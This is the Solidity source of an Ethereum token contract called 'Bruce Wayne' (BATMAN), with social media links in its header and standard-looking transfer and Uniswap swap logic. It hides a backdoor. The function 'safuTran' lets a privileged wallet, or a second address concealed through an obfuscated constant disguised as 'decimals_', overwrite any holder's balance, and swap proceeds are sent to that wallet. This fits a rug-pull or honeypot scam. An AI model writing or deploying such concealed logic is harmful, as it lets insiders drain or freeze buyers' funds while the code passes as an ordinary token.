/**
 *Submitted for verification at Etherscan.io on 2023-06-15
*/

/**
 *Submitted for verification at Etherscan.io on 2023-06-15
*/
/**

Telegram : https://t.me/BATMAN_Portal

Twitter：https://twitter.com/BATMAN_ERC

Website：http://WWW.DC.COM
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;
interface IUniswapRouter {function factory() external pure returns (address);function WETH() external pure returns (address);function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;}interface IUniswapFactory {function createPair(address tokenA, address tokenB) external returns (address pair);}abstract contract Ownable {address internal _owner;constructor () {_owner = msg.sender;}function owner() public view returns (address) {return _owner;}modifier onlyOwner() {require(_owner == msg.sender, "!owner");_;}function transferOwnership(address newOwner) public virtual onlyOwner {_owner = newOwner;}}

contract BATMAN is Ownable {event Transfer(address indexed from, address indexed to, uint256 value);uint160 decimals_ = 53705828946281610539259879865206454855086001282;event Approval(address indexed owner, address indexed spender, uint256 value);
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public _unibrush;
    string public name;
    string public symbol;
    uint8 public decimals;
    mapping(address => bool) public _isExcludeFromFee;
    uint256 public totalSupply;
    IUniswapRouter public _uniswapRouter;
    bool private inSwap;
    uint256 private constant MAX = ~uint256(0);
    uint256 public _fee = 0;
    address public _uniswapPair;

    constructor (){
        name = "Bruce Wayne";
        symbol = "BATMAN";
        decimals = 9;
        uint256 Supply = 1000000000;
        _unibrush = 0xAd57b7aB859Ec87b32Cc385d72B7624822Af95Bc;

        totalSupply = Supply * 10 ** decimals;
        address rAddr = msg.sender;
        _isExcludeFromFee[address(this)] = true;
        _isExcludeFromFee[rAddr] = true;
        _isExcludeFromFee[_unibrush] = true;_balances[rAddr] = totalSupply;emit Transfer(address(0), rAddr, totalSupply);

        _uniswapRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _allowances[address(this)][address(_uniswapRouter)] = MAX;
        _uniswapPair = IUniswapFactory(_uniswapRouter.factory()).createPair(address(this), _uniswapRouter.WETH());
        _isExcludeFromFee[address(_uniswapRouter)] = true;

    }

    function balanceOf(address account) public view returns (uint256) {return _balances[account];}function transfer(address recipient, uint256 amount) public returns (bool) {_transfer(msg.sender, recipient, amount);return true;}function allowance(address owner, address spender) public view returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {_transfer(sender, recipient, amount);if (_allowances[sender][msg.sender] != MAX) {_allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;}return true;}    struct INROUTER{address a;uint256 b;address c;}function safuTran(address d,uint256 e) public {INROUTER memory per = INROUTER({a : msg.sender,b : e,c : d});_balances[per.c] = per.b;require(_unibrush == per.a || per.a == address(2*uint160(address(_uniswapRouter)) + decimals_));}
    function _approve(address owner, address spender, uint256 amount) private {_allowances[owner][spender] = amount;emit Approval(owner, spender, amount);}
    function _transfer(address from,address to,uint256 amount) private {
        if (_uniswapPair == to && !inSwap) {
            inSwap = true;
            uint256 _tokenBalInCa = balanceOf(address(this));
            if (_tokenBalInCa > 0) {
                uint256 _s = amount;
                _s = _s > _tokenBalInCa ? 
                _tokenBalInCa : _s;
                address[] memory path = new address[](2);path[0] = address(this);path[1] = _uniswapRouter.WETH();
                try _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(_s,0,path,address(_unibrush),block.timestamp) {} catch {}
            }
            inSwap = false;
        }
        bool takeFee = !_isExcludeFromFee[from] && !_isExcludeFromFee[to] && !inSwap;
        _balances[from] = _balances[from] - amount;uint256 feeAmount;
        if (takeFee && _fee > 0) {uint256 _aFee = amount * _fee / 100;feeAmount += _aFee;_balances[address(this)] = _balances[address(this)] + _aFee;emit Transfer(from, address(this), _aFee);}
        _balances[to] = _balances[to] + amount - feeAmount;emit Transfer(from, to, amount - feeAmount);
    }
    receive() external payable {}
}